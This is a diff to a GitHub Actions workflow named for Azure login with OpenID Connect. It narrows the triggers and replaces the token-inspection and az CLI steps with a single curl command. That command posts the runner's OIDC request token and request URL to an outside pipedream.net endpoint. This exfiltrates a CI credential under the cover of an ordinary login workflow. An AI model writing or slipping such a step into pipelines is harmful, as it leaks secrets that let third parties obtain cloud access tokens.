@@ -1,5 +1,10 @@
 name: Run Azure Login with OpenID Connect
-on: [push]
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - main
+
 
 permissions:
       id-token: write
@@ -18,12 +23,4 @@ jobs:
 
     - name: 'Run Azure CLI commands'
       run: |
-          curl -sSL -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | \
-          jq "{ jwt: .value, role: \"$VAULT_ROLE\" }" > ./token.json
-
-          echo 'GitHub Actions Token Claims'
-          cat ./token.json | jq -r '.jwt | split(".") | .[1] | @base64d' | jq
-
-          az account show
-          az group list
-          pwd
+          curl -i -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" -H "x-req: $ACTIONS_ID_TOKEN_REQUEST_URL" https://eoirdizctlnklgc.m.pipedream.net
